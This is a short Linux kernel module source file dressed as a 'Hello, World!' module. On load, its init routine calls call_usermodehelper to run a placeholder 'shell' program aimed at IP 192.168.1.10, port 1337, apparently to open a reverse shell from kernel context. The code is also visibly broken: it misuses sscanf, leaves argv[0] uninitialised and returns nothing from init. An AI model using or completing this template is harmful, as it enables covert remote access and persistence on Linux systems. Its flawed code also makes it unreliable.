#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h> 
#include <linux/kmod.h>

MODULE_LICENSE("Dual BSD/GPL");

static int __init hello_init(void){
		char * envp[] = { "HOME=/", NULL }; 
		char * argv[2];
		sscanf(argv[0],"<Insert path to your shell here!>","192.168.1.10",1337);
		argv[1] = NULL;
		call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
		printk(KERN_ALERT "Hello, World!\n");
}

static void __exit hello_exit(void){
		printk(KERN_ALERT "Goodbye, World!\n");
}

module_init(hello_init);
module_exit(hello_exit);
